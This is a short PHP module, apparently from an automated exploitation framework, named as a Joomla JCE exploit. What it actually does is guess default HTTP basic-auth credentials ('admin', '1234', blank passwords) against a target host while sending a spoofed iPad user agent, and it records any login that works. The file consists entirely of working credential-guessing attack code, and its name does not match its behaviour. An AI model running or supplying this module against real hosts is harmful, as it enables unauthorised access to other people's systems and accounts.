<?php
class WebappJoomlaJCE extends Exploit {

	function run(){
		$logins = array("admin", "1234");
		$passwords = array("", "admin", "1234");
		$code = $this->curl($this->host->ipAdress);
		if($code==401){
			foreach($logins as $login){
				foreach($passwords as $password){
					echoCli("Trying to login with: ".$login.":".$password, "notice");
					$code = $this->curl($this->host->ipAdress, $login, $password);
					if($code!=401){
						echoCli("Login found! ".$login.":".$password, "success");
						$this->data = $login.":".$password;
						$this->status = 1;
						return true;
					}
				}
			}
		}else{
			echoCli("Target not Vulnerable", "failure");
		}
	}

	function curl($host, $username="", $password=""){
		$ch = curl_init($host);
		curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B405');
		if($username || $password)
			curl_setopt($ch, CURLOPT_USERPWD, $username . ":" . $password);
		curl_setopt($ch, CURLOPT_NOBODY, true);
		curl_setopt($ch, CURLOPT_TIMEOUT, 30);
		curl_exec($ch);
		$code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
		curl_close($ch);
		return $code;
	}
}
?>